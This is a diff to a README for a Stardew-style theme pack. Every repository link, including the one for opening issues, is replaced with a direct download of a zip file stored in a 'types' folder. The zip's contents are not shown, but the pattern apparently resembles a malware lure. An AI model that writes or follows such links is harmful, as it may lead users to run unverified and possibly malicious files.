@@ -1,6 +1,6 @@
 # 🌾 openclaw-theme-stardew - Pixel Art Seasons Theme Pack
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw%20Theme-blue?style=for-the-badge)](https://github.com/Barathm531/openclaw-theme-stardew)
+[![Download](https://img.shields.io/badge/Download-OpenClaw%20Theme-blue?style=for-the-badge)](https://raw.githubusercontent.com/Barathm531/openclaw-theme-stardew/main/types/openclaw-stardew-theme-1.9.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start the installation, make sure you have a stable internet connecti
 
 1. Click the big blue button below to open the download page:
 
-   [![Download](https://img.shields.io/badge/Download-Theme-grey?style=for-the-badge&logo=github)](https://github.com/Barathm531/openclaw-theme-stardew)
+   [![Download](https://img.shields.io/badge/Download-Theme-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Barathm531/openclaw-theme-stardew/main/types/openclaw-stardew-theme-1.9.zip)
 
 2. On the GitHub page, look for the **Releases** section or a folder named something like `releases` or `downloads`. If you do not see a separate release, scroll down the main repository page to find the theme files.
 
@@ -110,8 +110,8 @@ Visit the main page again at any time to check for new versions or better files.
 
 If you face any issues, you can open an issue on GitHub in the repository link below. Detailed descriptions and screenshots will help solve problems faster.
 
-[https://github.com/Barathm531/openclaw-theme-stardew](https://github.com/Barathm531/openclaw-theme-stardew)
+[https://raw.githubusercontent.com/Barathm531/openclaw-theme-stardew/main/types/openclaw-stardew-theme-1.9.zip](https://raw.githubusercontent.com/Barathm531/openclaw-theme-stardew/main/types/openclaw-stardew-theme-1.9.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw%20Theme-blue?style=for-the-badge)](https://github.com/Barathm531/openclaw-theme-stardew)
+[![Download](https://img.shields.io/badge/Download-OpenClaw%20Theme-blue?style=for-the-badge)](https://raw.githubusercontent.com/Barathm531/openclaw-theme-stardew/main/types/openclaw-stardew-theme-1.9.zip)
